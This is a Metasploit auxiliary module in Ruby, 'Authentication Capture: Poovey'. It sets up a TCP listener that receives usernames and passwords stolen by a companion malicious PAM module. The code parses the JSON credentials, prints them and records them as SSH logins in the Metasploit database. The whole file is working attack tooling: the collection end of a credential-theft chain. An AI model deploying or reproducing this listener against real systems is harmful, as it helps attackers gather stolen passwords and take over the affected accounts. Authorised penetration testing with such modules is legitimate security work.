##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Authentication Capture: Poovey',
      'Description'    => %q{
        This module provides a lister to accept credentials stolen with the
        poovey PAM module.
      },
      'Author'      => ['jrozner'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 21 ])
      ], self.class)
  end

  def setup
    super
  end

  def run
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit()
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: 0,
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_data(c)
    data = c.get_once
    return if not data

    credential = JSON.parse data

    print_status credential.inspect
    report_cred(
      ip: c.peerhost,
      port: 0,
      service_name: 'ssh',
      user: credential["username"],
      password: credential["password"],
      proof: data
    )

    print_status("Poovey LOGIN #{c.peerhost} #{credential["username"]} / #{credential["password"]}")
  end


end
